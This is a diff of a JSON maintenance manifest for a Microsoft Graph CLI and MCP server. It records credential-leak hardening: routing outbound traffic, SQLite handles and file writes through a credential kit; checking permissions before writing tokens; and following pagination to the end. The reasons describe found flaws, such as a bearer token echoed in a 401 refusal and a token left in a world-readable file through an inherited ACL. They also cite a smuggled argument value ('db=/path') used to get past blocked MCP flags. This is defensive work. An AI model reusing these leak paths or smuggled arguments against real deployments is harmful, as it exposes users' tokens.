+     "contains": "credkit.Exit(code)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/microsoft-graph-mcp/main.go",
+     "contains": "credkit.Exit(run())",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "var Declarations = credkit.Declarations{",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "if configPath, home, ok := cobraPathFlags(args); ok {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "var OutboundGuard = credkit.Transport",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "credkit.Hold(\"minted:authorization\", authHeader)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/msgraph_guard.go",
+     "contains": "next = client.OutboundGuard(next)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "Transport: credkit.Transport(nil)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "Transport: credkit.Transport(nil),",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/probe.go",
+     "contains": "Transport: credkit.Transport(nil)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "credkit.Hold(\"stdin\", token)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "return credkit.Terminal(f)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/microsoft-graph-mcp/main.go",
+     "contains": "server.WithToolHandlerMiddleware(credkit.MCPTools),",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/microsoft-graph-mcp/main.go",
+     "contains": "Listen(ctx, credkit.MCPIn(os.Stdin), credkit.MCPOut())",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "err := credkit.RunCommand(cmd)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/msgraph_hold.go",
+     "contains": "credkit.Hold(\"config:graph_token\", c.MicrosoftGraphToken)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/credkit_guard_test.go",
+     "contains": "func TestOutboundGuardIsTheKit(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations_test.go",
+     "contains": "func TestCredentialFilesReadsArgvLikeCobra(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/msgraphblackbox/sinks_test.go",
+     "contains": "func TestEveryHTTPClientIsGuarded(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/msgraphblackbox/blackbox_test.go",
+     "contains": "func TestOrdinaryRecordsReachEveryFile(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/msgraphblackbox/blackbox_test.go",
+     "contains": "func TestOrdinaryRecordsStillPrint(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credkit-sqlite-every-handle",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "Every SQLite handle goes through credkit.SQLDriver: internal/credsql registers the one driver and every sql.Open in store.go and platform/migration.go names it, the read-only opener included. The MCP sql value cap moved from sqlite.Limit on a held connection to a DSN parameter credsql applies as each connection opens.",
+   "why": "A statement's text and bound values are a sink of their own, reads included. Replaces the connector-only WithholdingSQLiteDriver (store/msgraph_withhold_driver.go) and the per-record secret stripping (store-never-keeps-secrets): the kit holds every declared response field at the transport, so a record that carries one is refused whole (TestStoreRefusesAHeldValue). The kit's connection does not forward Ping, so the read-only probe runs \"select 1\".",
+   "spec_encode_followup": "Press-side: generate store, migration and MCP sql opens against one kit-wrapped driver name, and express the MCP sql value cap as a connection-open setting.",
+   "asserts": [
+    {
+     "file": "cli/internal/credsql/credsql.go",
+     "contains": "sql.Register(Driver, credkit.SQLDriver(cappedSQLite()))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "sql.Open(credsql.Driver,",
+     "code_only": true,
+     "min_count": 4
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "func OpenReadOnlyValueCapped(dbPath string, maxValueBytes int) (*Store, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "not_contains": "sql.Open(\"sqlite\""
+    },
+    {
+     "file": "cli/internal/platform/migration.go",
+     "contains": "credsql.Driver",
+     "code_only": true,
+     "min_count": 4
+    },
+    {
+     "file": "cli/internal/platform/migration.go",
+     "not_contains": "sql.Open(\"sqlite\""
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "sqlite.Limit("
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "openMCPReadOnlyStore(path, mcpSQLMaxValueBytes)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/credkit_store_test.go",
+     "contains": "func TestStoreRefusesAHeldValue(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credsql/credsql_test.go",
+     "contains": "func TestLengthLimitAppliesToEveryConnection(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credkit-mcphttp-outermost",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "credkit.MCPHTTP writes every response the MCP HTTP server serves, refusals included. requireBearerAuthWithLimits runs a preflight that writes nothing, then credkit.MCPHTTP around a gate that answers the Origin, bearer and body-limit verdicts.",
+   "why": "With the kit wrapping only the inner handler, a refusal answers outside it: a bearer token holding the word unauthorized made a GET /mcp without Authorization return a piece of the held token (found in the threecx adoption; the same press template ships here). TestMCPHTTPProtocolErrorsWithheld fails when the kit does not wrap the server.",
+   "spec_encode_followup": "Press-side: generate the MCP HTTP auth wrapper so its refusals are written by the inner, kit-wrapped handler and only a write-free preflight runs before credkit.MCPHTTP.",
+   "asserts": [
+    {
+     "file": "cli/cmd/microsoft-graph-mcp/main.go",
+     "contains": "kit := credkit.MCPHTTP(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/microsoft-graph-mcp/main.go",
+     "contains": "kit.ServeHTTP(w, r)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/microsoft-graph-mcp/main.go",
+     "not_contains": "credkit.MCPHTTP(inner)"
+    },
+    {
+     "file": "cli/internal/msgraphblackbox/sinks_test.go",
+     "contains": "func TestMCPHTTPProtocolErrorsWithheld(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credkit-every-file-write",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "Every file this program writes, except the declared credential files, goes through the credential kit: credkit.WriteFile, OpenFile, AppendFile or NewWriter (feedback ledger, teach logs, learnings audit, learn journal, run profiles, platform profiles, response cache, export, --deliver file:, transcripts --out). config.toml and the 0600 credential store are written by cliutil.AtomicWriteCredentialFile, the declared exemption (they are Declarations.Files).",
+   "why": "Replaces the connector-only WithholdBytes / WithheldWriter / WithholdingFile wrappers (file-sinks-withheld). TestEveryFileWritePassesTheKit fails on any write site a reprint adds that is neither routed nor reviewed in its list, and TestNoCredentialInAnyWrittenFile proves the --deliver file write is withheld (it fails with that write unrouted).",
+   "spec_encode_followup": "Press-side: generate file sinks through credkit.WriteFile / OpenFile / AppendFile, and the config and credential-store writes through a declared-exemption helper.",
+   "asserts": [
+    {
+     "file": "cli/internal/cliutil/paths.go",
+     "contains": "if err := credkit.WriteFile(tmpPath, data, fileMode); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credentials.go",
+     "contains": "AtomicWriteCredentialFile(path, data, 0o600, 0o700)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "cliutil.AtomicWriteCredentialFile(",
+     "code_only": true,
+     "min_count": 3
+    },
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "return credkit.NewWriter(f, credkit.SinkFile), nil",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "if err := credkit.WriteFile(tmp, body, 0o600); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "credkit.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "contains": "credkit.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)",
+     "code_only": true,
+     "min_count": 2
+    },
+    {
+     "file": "cli/internal/learn/teach_log.go",
+     "contains": "credkit.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "credkit.AppendFile(p, append(line, '\\n'), 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "contains": "credkit.WriteFile(tmp, data, 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/profile.go",
+     "contains": "credkit.WriteFile(tmpName, data, 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcripts_download.go",
+     "contains": "credkit.WriteFile(flagOut, text, 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "credkit.WriteFile(cacheFile",
+     "code_only": true,
+     "min_count": 2
+    },
+    {
+     "file": "cli/internal/msgraphblackbox/writers_test.go",
+     "contains": "func TestEveryFileWritePassesTheKit(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credkit-profiles-held",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "Saved run profiles (profiles.json under every --home the command line can mean, and the legacy store) are read at startup and what they carry is held: a value under a credential-named flag, a saved --client-id or --client-secret under the flag's own source (so it may reach only Entra), and what a saved base-url carries; every member of a duplicate key, and a store that does not parse is held whole (credkit.HoldBody).",
+   "why": "A profile store is not named in Declarations.Files: the kit would hold every string in a nested file, and saved flags such as --select would withhold ordinary output. cliutil.CredentialProfileFlag copies the CLI's credentialLikeRunProfileFlag rule; TestCredentialProfileFlagMatchesTheCLI keeps the two the same, TestHoldRunProfileStoreHoldsEveryDuplicate the holding.",
+   "spec_encode_followup": "Press-side: let a Declarations literal name a run-profile store and the flag rule that marks its credential values.",
+   "asserts": [
+    {
+     "file": "cli/internal/cliutil/credkit_hold.go",
+     "contains": "func HoldRunProfileStore(data []byte) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "cliutil.HoldRunProfileStore(data)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "holdProfileStore(filepath.Join(dir, \"profiles.json\"))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credkit_hold_test.go",
+     "contains": "func TestHoldRunProfileStoreHoldsEveryDuplicate(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/msgraph_cred_rules_test.go",
+     "contains": "func TestCredentialProfileFlagMatchesTheCLI(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credential-file-private-before-bytes",
+   "class": "credential-file-perms",
+   "status": "active",
+   "summary": "The credential store and config writer (AtomicWriteCredentialFile) checks that the new temporary file is private before writing any byte and refuses otherwise, removing it; the error says the file was not saved.",
+   "why": "Codex 2026-11-06 round 1: a directory whose ACL passes read access down to new files (an NTFS inheritable BUILTIN\\Users grant, a macOS file_inherit entry) got the token written and published, and the permission check ran only afterwards, so auth set-token exited 10 with the token left in a file other users can read. Chmod sets mode bits only. Reproduced on macOS with the built binary (.review/pass3/acl). The generated test TestSaveCredentialsVerifiesWrittenFile asserted the published file on Windows; it now asserts the refusal and that no file in the data dir holds the token, on Windows (icacls) and macOS (chmod +a). Same class and shape as exchange-online's entry.",
+   "asserts": [
+    {
+     "file": "cli/internal/cliutil/paths.go",
+     "contains": "if err := VerifyCredsPerms(tmpPath); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credentials.go",
+     "contains": "credentials file not saved: permissions are unsafe for %s: %v",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credentials_perms_test.go",
+     "contains": "want a refusal before writing",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credentials_perms_test.go",
+     "contains": "\"everyone allow read,file_inherit\"",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "sync-reads-every-page",
+   "class": "incomplete-read",
+   "summary": "sync and workflow archive (and the MCP sync and workflow_archive tools, which run them) read every resource's Graph collection to its end through the shared page walk (graphReadPages, graphReadSkipWindows for numberAssignments) before anything is stored or reported complete; a read that cannot be finished is a sync_error that stores nothing, and --max-pages still reports max_pages_cap_hit.",
+   "why": "Adversarial review 2026-11-06 (executed against the built binary, .review/adv-r3/t08.sh, t09.sh): Graph pages every collection with @odata.nextLink and may return fewer items than $top asks (https://learn.microsoft.com/en-us/graph/paging). The generated sync paged every resource with $skip offsets, read no nextLink, and called a page shorter than $top the end, so GET /v1.0/security/alerts_v2?$top=100 answered with 50 alerts and a nextLink was one request, sync_complete total 50, warned 0, errored 0, exit 0, and security triage then showed 50 open alerts of 120; 6 users in pages of 2 stored 2; directory-roles and licenses (no pagination declared) and teams-users (no cursor) stopped at page 1 the same way. syncResource (generated sync.go) now reads each collection whole with syncGetGraphCollection (hand file msgraph_sync_pages.go) under sync's read policy: every page must carry a value array, every nextLink must name the configured host (one naming another host is an error and never followed) and a page not already read, a failed page fails the read, and the generated loop ends after that one read (complete, or max_pages_cap when --max-pages stopped it). A saved $skip cursor is not sent. The same change takes the first-response leniency off a walk that continues a collection (GetCollection's nextLink, a later $skip window), so a bare [] second page is an error, not the end. TestSyncReadsEveryPage, TestSyncIncompleteReadIsNeverComplete, TestSyncMaxPagesCapOnGraphPages and TestContinuationPageMustBeAGraphCollection fail on the old wiring; TestSyncBinaryReadsEveryPage drives the built CLI and MCP binaries. A reprint of sync.go restores the single-page read.",
+   "status": "active",
+   "spec_encode_followup": "press: generated sync follows @odata.nextLink (x-pagination nextLink) to the end and treats a short page as the end only for offset APIs that document it",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "if syncReadsGraphCollections(c) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "data, graph, err := syncGetGraphCollection(ctx, c, resource, path, params, maxPages)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "items, nextCursor, hasMore = graph.items, \"\", false",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "if !graph.whole && resourceSupportsPagination(resource) && nextCursor == \"\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "syncGraphCollectionEnd(syncEvents, resource, graph, maxPages, latestOnly, totalCount, &outcome)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "not_contains": "data, err := syncGet(ctx, c, resource, \"\", path, params)"
+    },
+    {
+     "file": "cli/internal/cli/msgraph_sync_pages.go",
+     "contains": "func syncGetGraphCollection(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/msgraph_sync_pages.go",
+     "contains": "if err := checkPinned(rd.origins, u); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pull.go",
+     "contains": "if page == 1 && !continued && rd == nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/msgraph_teams_pages.go",
+     "contains": "rest, err := graphReadPages(ctx, c, graphRelPath(u.Path), flattenQuery(u.Query()), headers, true, nil)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/msgraph_sync_pages_test.go",
+     "contains": "func TestSyncReadsEveryPage(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/msgraph_sync_pages_test.go",
+     "contains": "func TestSyncIncompleteReadIsNeverComplete(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/msgraph_sync_pages_test.go",
+     "contains": "func TestContinuationPageMustBeAGraphCollection(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/msgraphblackbox/sync_pages_test.go",
+     "contains": "func TestSyncBinaryReadsEveryPage(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  }
+ ],
+ "retired": [
+  {
+   "id": "mcp-filesystem-destination-gate",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 builds a per-command blocked set (blockedDestinationFlags, blockedInputFlags, root control-plane flags), removes those flags from each tool's schema, refuses any undeclared argument name (so \"db=/path\" is refused) and skips '=' names in cliArgsFromMCP."
+  },
+  {
+   "id": "mcp-argv-value-joined",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #4647: every value-carrying branch of cliArgsFromMCP joins the value to its flag (--k=v, one element per list item), and the press generates TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag."
+  },
+  {
+   "id": "interim-http-security-note-2026-10-22",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: The note paused HTTP mode until a reprint because the build served HTTP with no token. Press 4.34.0 HTTP mode refuses to start without <PREFIX>_MCP_HTTP_TOKEN, answers 401 without the right bearer, binds 127.0.0.1 by default and refuses a non-loopback address without TLS; onboard.py now writes HTTP guidance that follows the binary (cc-skills #14) and never writes this note, so the entry would fail on every re-onboard."
+  },
+  {
+   "id": "mcp-file-flags-refused",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0's cobratree mirror derives one blocked set per command (destination, input, mcp:write-flags, mcp:read-flags and root control-plane flags), leaves those flags out of the tool schema and refuses them, and any undeclared argument, by name."
+  }
+ ],
+ "_superseded": [
+  {
+   "id": "output-chokepoint",
+   "reason": "replaced by the shared credential kit",
+   "by": "credkit-wiring"
+  },
+  {
+   "id": "file-sinks-withheld",
+   "reason": "replaced by the shared credential kit",
+   "by": "credkit-every-file-write"
+  },
+  {
+   "id": "network-sinks-withheld",
+   "reason": "replaced by the shared credential kit",
+   "by": "credkit-wiring"
+  },
+  {
+   "id": "mcp-protocol-messages-withheld",
+   "reason": "replaced by the shared credential kit",
+   "by": "credkit-wiring"
+  },
+  {
+   "id": "startup-output-held-first",
+   "reason": "replaced by the shared credential kit",
+   "by": "credkit-wiring"
+  },
+  {
+   "id": "held-forms-in-every-encoding",
+   "reason": "replaced by the shared credential kit",
+   "by": "credkit-wiring"
+  },
+  {
+   "id": "undecoded-encodings-every-alignment",
+   "reason": "replaced by the shared credential kit",
+   "by": "credkit-wiring"
+  },
+  {
+   "id": "members-held-in-every-view",
+   "reason": "replaced by the shared credential kit",
+   "by": "credkit-wiring"
+  },
+  {
+   "id": "secret-echo-decoded-funnel",
+   "reason": "replaced by the shared credential kit",
+   "by": "credkit-wiring"
+  },
+  {
+   "id": "store-never-keeps-secrets",
+   "reason": "replaced by the shared credential kit",
+   "by": "credkit-sqlite-every-handle"
+  },
+  {
+   "id": "mcp-held-arguments-refused",
+   "reason": "replaced by the shared credential kit",
+   "by": "credkit-wiring"
   }
  ]
 }
